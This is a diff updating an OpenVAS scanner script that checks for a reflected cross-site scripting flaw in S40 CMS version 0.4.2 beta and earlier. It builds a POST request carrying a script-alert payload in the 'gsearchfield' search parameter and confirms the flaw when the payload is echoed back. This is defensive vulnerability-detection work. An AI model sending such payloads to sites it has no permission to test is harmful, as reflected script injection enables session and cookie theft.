@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_s40_cms_xss_vuln.nasl 7006 2017-08-25 11:51:20Z teissa $
+# $Id: gb_s40_cms_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
 #
 # S40 Content Management System (CMS) Cross-Site Scripting Vulnerability
 #
@@ -27,14 +27,14 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801961");
-  script_version("$Revision: 7006 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-08-25 13:51:20 +0200 (Fri, 25 Aug 2017) $");
+  script_version("$Revision: 11997 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-08-04 10:01:53 +0200 (Thu, 04 Aug 2011)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
   script_name("S40 Content Management System (CMS) Cross-Site Scripting Vulnerability");
-  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=209");
-  script_xref(name : "URL" , value : "http://secpod.org/advisories/SECPOD_S40_CMS_XSS.txt");
+  script_xref(name:"URL", value:"http://secpod.org/blog/?p=209");
+  script_xref(name:"URL", value:"http://secpod.org/advisories/SECPOD_S40_CMS_XSS.txt");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
@@ -43,21 +43,18 @@ if(description)
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "impact" , value : "Successful exploitation will allow attacker to execute arbitrary
+  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
   HTML and script code in a user's browser session in the context of a vulnerable
   site. This may allow an attacker to steal cookie-based authentications and launch
-  further attacks.
-
-  Impact Level: Application");
-  script_tag(name : "affected" , value : "S40 Content Management System (CMS) v0.4.2 beta and prior.");
-  script_tag(name : "insight" , value : "The flaw is caused by improper validation of user-supplied input
+  further attacks.");
+  script_tag(name:"affected", value:"S40 Content Management System (CMS) v0.4.2 beta and prior.");
+  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input
   passed via the 'gsearchfield' parameter in 'index.php' is not properly verified
   before it is returned to the user.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "This host is running S40 Content Management System (CMS) and is
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is running S40 Content Management System (CMS) and is
   prone to cross site scripting vulnerability.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
@@ -69,10 +66,8 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
 port = get_http_port(default:80);
 
-## Check Host Supports PHP
 if(!can_host_php(port:port)) {
   exit(0);
 }
@@ -84,27 +79,21 @@ foreach dir(make_list_unique("/cms", "/", "/s40", "/s40cms", cgi_dirs(port:port)
 
   if(dir == "/") dir = "";
 
-  ## Send and Receive the response
   res = http_get_cache(item: dir + "/index.php", port:port);
 
-  ## Confirm the application
   if("Powered by S40 CMS" >< res)
   {
-    ## Construct the Attack Request
     postData = "gsearchfield=<script>alert('OpenVAS-XSS-TEST')</script>" +
                "&gs=true&gsearchsubmit=Search";
 
-    ## Construct XSS post attack request
     req = string("POST ", dir, "/index.php HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ", strlen(postData), "\r\n\r\n", postData);
 
-    ## Try XSS Attack
     res = http_keepalive_send_recv(port:port, data:req);
 
-    ## Confirm exploit worked by checking the response
     if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
      ("'<script>alert('OpenVAS-XSS-TEST')</script>" >< res))
     {
